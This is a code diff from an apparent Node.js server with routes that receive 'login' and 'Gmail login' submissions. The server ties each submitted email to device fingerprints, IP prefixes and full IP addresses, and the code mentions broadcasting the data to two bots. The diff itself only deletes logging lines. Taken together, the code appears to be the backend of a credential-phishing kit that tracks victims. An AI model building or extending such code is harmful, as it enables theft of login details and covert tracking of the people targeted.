@@ -252,30 +252,25 @@ app.post("/send-login", async (req, res) => {
     // Layer 1: Device Fingerprint
     if (fingerprint && email) {
       deviceFingerprintToEmail[fingerprint] = email;
-      console.log(`💾 Stored fingerprint ${fingerprint} → ${email}`);
     }
 
     // Layer 2: IP Prefix + User ID
     if (ipPrefix && userId && email) {
       const compositeKey = `${ipPrefix}_${userId}`;
       ipPrefixUserIdToEmail[compositeKey] = email;
-      console.log(`💾 Stored composite key ${compositeKey} → ${email}`);
     }
 
     // Layer 4: IP Prefix
     if (ipPrefix && email) {
       ipPrefixToEmail[ipPrefix] = email;
-      console.log(`💾 Stored IP prefix ${ipPrefix} → ${email}`);
     }
 
     // Layer 5: Full IP
     if (ip && email) {
       ipToEmail[ip] = email;
-      console.log(`💾 Stored full IP ${ip} → ${email}`);
     }
 
     console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
-    console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
     // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
@@ -1125,7 +1120,6 @@ app.post("/send-gmail-login", async (req, res) => {
     // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING
     if (fingerprint && email) {
       deviceFingerprintToEmail[fingerprint] = email;
-      console.log(`💾 Stored fingerprint ${fingerprint} → ${email} (Gmail flow)`);
     }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
